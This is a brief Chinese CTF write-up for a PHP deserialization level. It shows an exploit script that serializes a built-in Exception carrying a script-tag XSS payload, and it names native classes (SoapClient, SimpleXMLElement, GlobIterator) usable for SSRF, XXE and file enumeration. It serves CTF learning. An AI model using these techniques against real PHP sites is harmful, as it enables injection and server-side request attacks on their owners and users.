# WriteUP · Level 25 · 原生类 · Error / Exception

## 原理

PHP 的 `Exception`(以及 PHP 7+ 的 `Error`)是内置类,**自带 `__toString`**:
对象被当成字符串输出时,构造参数里的消息文本会原样带出。
当 POP 链找不到可用类时,原生类就是"现成的载体"。

## EXP

```php
<?php
// Exception 自带 __toString,echo 时输出可控内容(PHP 7+ 还有同门的 Error 类,用法一致)
$e = new Exception("<script>alert('helloctf')</script>");
echo "o=" . urlencode(serialize($e));
```

序列化串形如 `O:9:"Exception":7:{...}`,其中消息文本完全可控。
页面 `echo` 该对象 → 输出携带 `<script>` 与 `alert` → 校验通过。

## 更多原生类(扩展阅读)

- **SoapClient**:调用不存在的方法触发 `__call`,发出 HTTP 请求(需 soap 扩展),
  配合 CRLF 注入可控 User-Agent → SSRF 利器(参考 ctfshow web259);
- **SimpleXMLElement**:构造时加载 XML(需 simplexml 扩展,默认启用),可用于 XXE;
- **GlobIterator / FilesystemIterator**:带通配符的目录枚举,配合 `SplFileObject` 更灵活。

